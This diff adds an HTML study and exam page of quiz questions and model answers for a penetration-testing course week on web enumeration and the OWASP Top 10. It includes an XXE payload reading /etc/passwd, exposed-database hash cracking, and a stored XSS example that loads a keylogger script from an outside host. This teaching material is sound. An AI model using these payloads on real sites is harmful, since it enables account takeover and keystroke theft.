@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Week 3 - Questions &amp; Exam Mode</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@600;800&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#090d16;--card:#111827;--hover:#162032;--text:#f8fafc;--muted:#94a3b8;--border:rgba(255,255,255,.1);--ok:#10b981;--bad:#f43f5e}
+[data-theme="light"]{--bg:#f8fafc;--card:#fff;--hover:#f1f5f9;--text:#0f172a;--muted:#475569;--border:rgba(0,0,0,.1)}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'Plus Jakarta Sans',system-ui,sans-serif;line-height:1.6;min-height:100vh;overflow-x:hidden}
+header{max-width:900px;margin:0 auto;padding:56px 24px 16px;position:relative}
+.badge{display:inline-block;font-size:11px;font-weight:800;letter-spacing:.6px;text-transform:uppercase;padding:4px 12px;border-radius:20px;background:rgba(168,85,247,.15);color:#a855f7;border:1px solid rgba(168,85,247,.3)}
+h1{font-size:clamp(26px,6vw,38px);font-weight:800;margin:14px 0 8px;line-height:1.2}
+h1 span{background:linear-gradient(135deg,#a855f7,#06b6d4);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.sub{color:var(--muted)}
+.top{position:absolute;top:20px;right:24px;display:flex;gap:8px}
+.top button,.top a{width:44px;height:44px;background:var(--card);color:var(--text);border:1px solid var(--border);border-radius:10px;cursor:pointer;font-size:18px;text-decoration:none;display:flex;align-items:center;justify-content:center}
+.modes{max-width:900px;margin:0 auto;padding:8px 24px;display:flex;gap:10px;flex-wrap:wrap}
+.btn{font:inherit;font-weight:700;font-size:14px;padding:10px 18px;border-radius:10px;border:1px solid var(--border);background:var(--card);color:var(--text);cursor:pointer}
+.btn.on,.btn.primary{background:#a855f7;color:#fff;border-color:#a855f7}
+main{max-width:900px;margin:0 auto;padding:8px 24px 56px}
+h2.part{font-family:'JetBrains Mono',monospace;font-size:13px;color:#a855f7;text-transform:uppercase;letter-spacing:1px;margin:28px 0 10px}
+.q{background:var(--card);border:1px solid var(--border);border-top:3px solid var(--c,#a855f7);border-radius:16px;padding:20px;margin-bottom:16px}
+.mcq{--c:#3b82f6}.tf{--c:#a855f7}.sa{--c:#f59e0b}.sc{--c:#06b6d4}
+.meta{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:800;color:var(--c);margin-bottom:8px}
+.qt{font-weight:600;margin-bottom:12px;overflow-wrap:anywhere}
+.opt{display:flex;gap:10px;align-items:flex-start;padding:10px 12px;border:1px solid var(--border);border-radius:10px;margin-bottom:8px;cursor:pointer;background:var(--hover);overflow-wrap:anywhere}
+.opt input{margin-top:5px}
+.opt.right{border-color:var(--ok);background:rgba(16,185,129,.15)}
+.opt.wrong{border-color:var(--bad);background:rgba(244,63,94,.15)}
+.ans{margin-top:12px;padding:12px 14px;border-left:3px solid var(--ok);background:rgba(16,185,129,.08);border-radius:8px;font-size:14px;overflow-wrap:anywhere}
+ul{padding-left:20px;margin-top:6px}li{margin-bottom:6px;overflow-wrap:anywhere}
+#result{display:none;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;margin-bottom:16px;font-weight:700}
+.hide{display:none!important}
+.timer{font-family:'JetBrains Mono',monospace;color:var(--muted);align-self:center}
+footer{text-align:center;padding:24px 16px;color:var(--muted);font-size:13px;border-top:1px solid var(--border)}
+@media(max-width:600px){header{padding:72px 16px 12px}.modes,main{padding-left:16px;padding-right:16px}.top{top:16px;right:16px}}
+</style>
+</head>
+<body>
+<header>
+  <div class="top"><a href="index.html" aria-label="Home">&#8962;</a><button id="theme" aria-label="Toggle theme">&#9788;</button></div>
+  <span class="badge">Week 3 &middot; Web Enumeration &amp; OWASP Top 10</span>
+  <h1><span>Week 3</span> Questions</h1>
+  <p class="sub">Study Mode shows every question with its answer. Exam Mode quizzes you on the MCQ and True/False questions.</p>
+</header>
+<div class="modes">
+  <button class="btn on" id="bStudy">Study Mode</button>
+  <button class="btn" id="bExam">Exam Mode (MCQ + T/F)</button>
+  <span class="timer hide" id="timer"></span>
+</div>
+<main id="app"></main>
+<footer>&copy; Zaneso &mdash; Penetration Testing Course Notes</footer>
+<script>
+const D={"Q": [{"part": "PART 1 \u00b7 KNOWLEDGE CHECK \u2014 Check Your Understanding", "type": "mcq", "label": "MCQ", "tag": "SINGLE ANSWER", "q": "The OWASP Top 10 is best described as:", "opts": ["An exhaustive list of every web vulnerability", "A community-driven, risk-prioritized list of the most critical web app security risks", "A legal compliance requirement for all websites", "A scanning tool distributed by OWASP"], "ans": 1, "ansText": "Correct: B"}, {"part": "PART 1 \u00b7 KNOWLEDGE CHECK \u2014 Check Your Understanding", "type": "tf", "label": "TRUE / FALSE", "tag": "T/F", "q": "Web enumeration is optional if you already know which OWASP category you want to exploit.", "ans": false, "ansText": "A: False. Enumeration identifies WHERE input points exist and WHAT technology is in use \u2014 without it, you cannot reliably target any category."}, {"part": "PART 1 \u00b7 KNOWLEDGE CHECK \u2014 Check Your Understanding", "type": "sa", "label": "SHORT ANSWER", "tag": "SHORT", "q": "Name two things web enumeration maps before exploitation begins.", "ansText": "Model Answer: Pages/endpoints and parameters (also acceptable: hidden directories, technologies, input points). Enumeration reveals the attack surface so exploitation targets real, reachable entry points rather than guesses."}, {"part": "PART 2 \u00b7 KNOWLEDGE CHECK \u2014 Injection \u0026 Command Injection", "type": "mcq", "label": "MCQ", "tag": "SINGLE ANSWER", "q": "Which PHP function executes a command and returns output directly to the browser, producing ACTIVE command injection?", "opts": ["mysqli_query()", "passthru($command_string)", "header()", "file_get_contents()"], "ans": 1, "ansText": "Correct: B"}, {"part": "PART 2 \u00b7 KNOWLEDGE CHECK \u2014 Injection \u0026 Command Injection", "type": "tf", "label": "TRUE / FALSE", "tag": "T/F", "q": "In Blind Command Injection, the system command's response is visible in the HTML document.", "ans": false, "ansText": "A: False. Blind means the response is NOT returned in the HTML \u2014 confirmation requires time-based or out-of-band techniques."}, {"part": "PART 2 \u00b7 KNOWLEDGE CHECK \u2014 Injection \u0026 Command Injection", "type": "sa", "label": "SHORT ANSWER", "tag": "SHORT", "q": "Why is allow-listing preferred over stripping dangerous characters for preventing command injection?", "ansText": "Model Answer: Allow-listing explicitly compares input against known-safe values and rejects everything else, closing unknown edge cases. Stripping attempts to remove dangerous characters but is fragile \u2014 attackers routinely bypass incomplete blocklists with encoding, nesting, or novel metacharacters."}, {"part": "PART 3 \u00b7 KNOWLEDGE CHECK \u2014 Auth \u0026 Data Exposure", "type": "mcq", "label": "MCQ", "tag": "SINGLE ANSWER", "q": "The MD5 hash 5f4dcc3b5aa765d61d8327deb882cf99 cracks to which plaintext?", "opts": ["admin", "123456", "password", "letmein"], "ans": 2, "ansText": "Correct: C"}, {"part": "PART 3 \u00b7 KNOWLEDGE CHECK \u2014 Auth \u0026 Data Exposure", "type": "tf", "label": "TRUE / FALSE", "tag": "T/F", "q": "The \"leading space\" re-registration trick (' admin') is a form of brute-force attack.", "ans": false, "ansText": "A: False. It is a developer input-sanitization logic flaw \u2014 a new user is created with admin-equivalent rights, distinct from credential guessing."}, {"part": "PART 3 \u00b7 KNOWLEDGE CHECK \u2014 Auth \u0026 Data Exposure", "type": "sa", "label": "SHORT ANSWER", "tag": "SHORT", "q": "After downloading an exposed SQLite database, what command reveals the column structure of the customers table?", "ansText": "Model Answer: PRAGMA table_info(customers); \u2014 run inside sqlite3 \u003cdatabase-name\u003e. This returns each column's name, type, and ordinal position, telling the attacker which fields hold credentials or PII worth extracting with SELECT * FROM customers;."}, {"part": "PART 4 \u00b7 KNOWLEDGE CHECK \u2014 XML \u0026 XXE", "type": "mcq", "label": "MCQ", "tag": "SINGLE ANSWER", "q": "In the payload \u003c!DOCTYPE root [\u003c!ENTITY read SYSTEM 'file:///etc/passwd'\u003e], what does SYSTEM signify?", "opts": ["The entity is defined locally inside the DTD", "The entity references an external resource via a URI", "The XML document is a system file", "The parser should ignore the entity"], "ans": 1, "ansText": "Correct: B"}, {"part": "PART 4 \u00b7 KNOWLEDGE CHECK \u2014 XML \u0026 XXE", "type": "tf", "label": "TRUE / FALSE", "tag": "T/F", "q": "In blind (out-of-band) XXE, the attacker receives the exfiltrated data directly in the HTTP response body.", "ans": false, "ansText": "A: False. In blind/OOB XXE the data is sent to an attacker-controlled server or file \u2014 the immediate HTTP response does not contain it."}, {"part": "PART 4 \u00b7 KNOWLEDGE CHECK \u2014 XML \u0026 XXE", "type": "sa", "label": "SHORT ANSWER", "tag": "SHORT", "q": "Name three impact categories of XXE beyond local file read.", "ansText": "Model Answer: Denial of Service (DoS), Server-Side Request Forgery (SSRF) including port scanning of internal networks, and in severe cases Remote Code Execution. XXE is not just a file-disclosure bug \u2014 it can pivot into internal network reconnaissance and code execution."}, {"part": "PART 5 \u00b7 KNOWLEDGE CHECK \u2014 Access Control \u00b7 Misconfig \u00b7 XSS", "type": "mcq", "label": "MCQ", "tag": "SINGLE ANSWER", "q": "Which XSS type is persisted in the database and triggers for every visitor of the affected page?", "opts": ["Reflected XSS", "DOM-based XSS", "Stored XSS", "Mutation XSS"], "ans": 2, "ansText": "Correct: C"}, {"part": "PART 5 \u00b7 KNOWLEDGE CHECK \u2014 Access Control \u00b7 Misconfig \u00b7 XSS", "type": "tf", "label": "TRUE / FALSE", "tag": "T/F", "q": "In the IDOR bank example, changing account_number=1234 to 1235 only works if the application fails to verify that the requesting user owns the target account.", "ans": true, "ansText": "A: True. IDOR exploits missing ownership/authorization checks on direct object references \u2014 the parameter itself is not the flaw, the absent validation is."}, {"part": "PART 5 \u00b7 KNOWLEDGE CHECK \u2014 Access Control \u00b7 Misconfig \u00b7 XSS", "type": "sa", "label": "SHORT ANSWER", "tag": "SHORT", "q": "Name two real-world impacts of the Mirai botnet's October 2016 attack on Dyn.", "ansText": "Model Answer: Mirai took Dyn (a DNS provider) offline, causing outages at Amazon, Twitter, Netflix, GitHub, Xbox Live, and PlayStation Network for hours across three attack waves. The botnet was built by compromising IoT devices and routers via 63 default username/password pairs on exposed Telnet services \u2014 a textbook Security Misconfiguration failure at ecosystem scale."}, {"part": "PART 6 \u00b7 KNOWLEDGE CHECK \u2014 ZAP Workflow", "type": "mcq", "label": "MCQ", "tag": "SINGLE ANSWER", "q": "Which ZAP feature brute-forces directories by iterating a wordlist against a target site?", "opts": ["Fuzzer", "Forced Browse", "Ajax Spider", "Passive Scanner"], "ans": 1, "ansText": "Correct: B"}, {"part": "PART 6 \u00b7 KNOWLEDGE CHECK \u2014 ZAP Workflow", "type": "tf", "label": "TRUE / FALSE", "tag": "T/F", "q": "Fuzzer results under 8 characters on DVWA's Brute Force page should be treated as valid credentials.", "ans": false, "ansText": "A: False. The room explicitly flags results under 8 characters as common false positives \u2014 they should be ignored."}, {"part": "PART 6 \u00b7 KNOWLEDGE CHECK \u2014 ZAP Workflow", "type": "sa", "label": "SHORT ANSWER", "tag": "SHORT", "q": "Why must the ZAP CA certificate be imported into Firefox before testing HTTPS targets?", "ansText": "Model Answer: ZAP intercepts HTTPS traffic by performing SSL/TLS on behalf of the browser using its own certificate. Firefox will only trust that certificate (and allow interception without warnings) if the ZAP CA is imported and both trust boxes are checked. The room explicitly warns \"Do not skip this step\" \u2014 without it, ZAP cannot simultaneously forward and intercept HTTPS requests."}], "scen": {"text": "A mock web application has: (1) A login form vulnerable to the 'leading space' re-registration flaw. (2) A flat-file SQLite database exposed under a guessable directory. (3) A comment field vulnerable to Stored XSS. Answer the following: (a) Categorize \u2014 Name the OWASP category for each of the three issues. (b) Exploit \u2014 Describe the exact exploitation technique for each using the real methods taught (username re-registration, sqlite3 dump + CrackStation, stored XSS payload). (c) Discover \u0026 Roadmap \u2014 State which ZAP feature (Forced Browse, Fuzzer, Automated Scan, or authenticated scanning) would help discover each, and which future course week would provide deeper exploitation.", "issues": [["Issue (1) \u2014 Leading-space re-registration", ["(a) OWASP category: Broken Authentication (A2).", "(b) Exploitation: Re-register username ' admin' (leading space). The app creates a new user with admin-equivalent rights due to missing input sanitization. Login with the new account to access admin functions.", "(c) ZAP feature: Fuzzer (probe registration inputs) or authenticated scanning. Future week: Week 7 (Broken Auth deep-dive)."]], ["Issue (2) \u2014 Exposed SQLite DB", ["(a) OWASP category: Sensitive Data Exposure (A3).", "(b) Exploitation: Download the SQLite file from the guessable directory, then: PRAGMA / SELECT \u2026 FROM. Extract password hashes (e.g., 5f4dcc3b5aa765d61d8327deb882cf99) and crack via CrackStation \u2192 plaintext password.", "(c) ZAP feature: Forced Browse (directory brute-force to find guessable path). Future week: Week 9 (Cryptographic Failures)."]], ["Issue (3) \u2014 Stored XSS in comment field", ["(a) OWASP category: Cross-Site Scripting (A7).", "(b) Exploitation: Submit \u003cscript\u003ealert(\"Hello World\")\u003c/script\u003e as a comment. Persisted in DB, executes for every visitor. Escalate with \u003cscript src=\"https://xss-payloads.com/simplekeylogger.js\"\u003e\u003c/script\u003e for keylogging.", "(c) ZAP feature: Automated Scan (active scanning XSS) + authenticated scanning (reach the comment form). Future week: Week 5 (XSS \u0026 CSRF)."]]]}};
+const r=document.documentElement,s=localStorage.getItem('theme');
+if(s)r.setAttribute('data-theme',s);
+document.getElementById('theme').onclick=()=>{const n=r.getAttribute('data-theme')==='dark'?'light':'dark';r.setAttribute('data-theme',n);localStorage.setItem('theme',n)};
+const app=document.getElementById('app'),timer=document.getElementById('timer');
+const L='ABCD';let tick=null;
+const esc=t=>t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function head(q){return `<div class="meta"><span>${esc(q.label)}</span><span>${esc(q.tag)}</span></div><div class="qt">${esc(q.q)}</div>`}
+function study(){
+  clearInterval(tick);timer.classList.add('hide');
+  let h='',part='';
+  D.Q.forEach(q=>{
+    if(q.part!==part){part=q.part;h+=`<h2 class="part">${esc(part)}</h2>`}
+    h+=`<div class="q ${q.type}">${head(q)}`;
+    if(q.type==='mcq')h+=q.opts.map((o,i)=>`<div class="opt ${i===q.ans?'right':''}"><b>${L[i]})</b><span>${esc(o)}</span></div>`).join('');
+    h+=`<div class="ans">${esc(q.ansText)}</div></div>`;
+  });
+  h+=`<h2 class="part">Synthesis · Closing Scenario</h2><div class="q sc"><div class="meta"><span>Closing Scenario — Integrated Application</span><span>SCENARIO</span></div><div class="qt">${esc(D.scen.text)}</div><div class="ans"><b>Scenario — Model Answer</b>`;
+  D.scen.issues.forEach(p=>{h+=`<p style="margin-top:10px"><b>${esc(p[0])}</b></p><ul>${p[1].map(x=>`<li>${esc(x)}</li>`).join('')}</ul>`});
+  h+=`</div></div>`;
+  app.innerHTML=h;
+}
+let ex=[];
+function exam(){
+  clearInterval(tick);
+  ex=D.Q.filter(q=>q.type!=='sa');
+  let h=`<div id="result"></div>`;
+  ex.forEach((q,k)=>{
+    h+=`<div class="q ${q.type}" id="e${k}"><div class="meta"><span>Question ${k+1} of ${ex.length}</span><span>${q.type==='mcq'?'Multiple Choice':'True or False'}</span></div><div class="qt">${esc(q.q)}</div>`;
+    const opts=q.type==='mcq'?q.opts.map((o,i)=>[i,L[i]+') '+o]):[[1,'True'],[0,'False']];
+    h+=opts.map(([v,t])=>`<label class="opt"><input type="radio" name="q${k}" value="${v}"><span>${esc(t)}</span></label>`).join('');
+    h+=`<div class="ans hide"></div></div>`;
+  });
+  h+=`<div style="display:flex;gap:10px;flex-wrap:wrap"><button class="btn primary" id="sub">Submit Exam</button><button class="btn" id="rst">Restart</button></div>`;
+  app.innerHTML=h;
+  let t=0;timer.classList.remove('hide');timer.textContent='00:00';
+  tick=setInterval(()=>{t++;timer.textContent=String(Math.floor(t/60)).padStart(2,'0')+':'+String(t%60).padStart(2,'0')},1000);
+  document.getElementById('rst').onclick=exam;
+  document.getElementById('sub').onclick=()=>{
+    clearInterval(tick);let sc=0;
+    ex.forEach((q,k)=>{
+      const box=document.getElementById('e'+k);
+      const c=box.querySelector('input:checked');
+      const correct=q.type==='mcq'?q.ans:(q.ans?1:0);
+      const val=c?+c.value:null;
+      if(val===correct)sc++;
+      box.querySelectorAll('label.opt').forEach(l=>{
+        const v=+l.querySelector('input').value;
+        if(v===correct)l.classList.add('right');
+        else if(v===val)l.classList.add('wrong');
+        l.querySelector('input').disabled=true;
+      });
+      const a=box.querySelector('.ans');a.classList.remove('hide');
+      a.innerHTML=(val===null?'<b>Not answered.</b> ':val===correct?'<b>Correct.</b> ':'<b>Incorrect.</b> ')+esc(q.ansText);
+    });
+    const res=document.getElementById('result');
+    res.style.display='block';
+    res.textContent=`Score: ${sc} / ${ex.length} (${Math.round(sc/ex.length*100)}%) · Time ${timer.textContent}`;
+    document.getElementById('sub').disabled=true;
+    window.scrollTo({top:0,behavior:'smooth'});
+  };
+}
+const bS=document.getElementById('bStudy'),bE=document.getElementById('bExam');
+bS.onclick=()=>{bS.classList.add('on');bE.classList.remove('on');study()};
+bE.onclick=()=>{bE.classList.add('on');bS.classList.remove('on');exam()};
+study();
+</script>
+</body>
+</html>
